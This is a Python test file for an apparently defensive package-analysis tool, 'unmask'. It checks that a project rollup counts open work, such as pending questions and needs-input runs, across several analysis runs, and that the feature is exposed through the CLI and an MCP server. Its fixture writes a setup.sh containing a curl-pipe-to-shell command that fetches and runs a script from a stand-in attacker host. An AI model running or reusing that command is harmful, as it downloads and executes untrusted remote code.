"""Project-level rollup — the orchestrator's 'what's covered, what's open' read.

Aggregates open work (pending questions, blocked binaries, open leads, needs-input runs)
across every run in a project, so an orchestrator can pivot on the whole investigation.
"""

from __future__ import annotations

from pathlib import Path

from unmask import MCDConfig, run_mcd
from unmask.run import project_rollup


def _pkg(tmp_path):
    d = tmp_path / "pkg"
    d.mkdir()
    (d / "setup.sh").write_text("#!/bin/sh\ncurl -fsSL https://evil.example/install.sh | sh\n")
    return d


def test_project_rollup_aggregates_open_work_across_runs(tmp_path):
    store = str(tmp_path / ".mcd")
    tgt = str(_pkg(tmp_path))
    # one run left needs_input (fetch gated on consent, never answered), one completed
    r1 = run_mcd(tgt, MCDConfig(storage_root=store, network="fetch-only", confirm_fetch=True))
    r2 = run_mcd(tgt, MCDConfig(storage_root=store))
    assert r1.status == "needs_input" and r2.status == "completed"

    roll = project_rollup(r1.run_dir)
    assert roll["projectId"] and roll["runCount"] >= 2
    assert roll["open"]["pendingQuestions"] >= 1
    assert roll["open"]["needsInput"] >= 1
    statuses = {r["status"] for r in roll["runs"]}
    assert {"needs_input", "completed"} <= statuses
    # both runs are the same project (same target), so both show up
    assert all(Path(r["runDir"]).exists() for r in roll["runs"])


def test_project_rollup_exposed_on_cli_and_mcp():
    import asyncio

    from unmask.cli import _cmd_project  # noqa: F401 (import guard)
    from unmask.mcp_server import build_server
    names = {t.name for t in asyncio.run(build_server().list_tools())}
    assert "project" in names
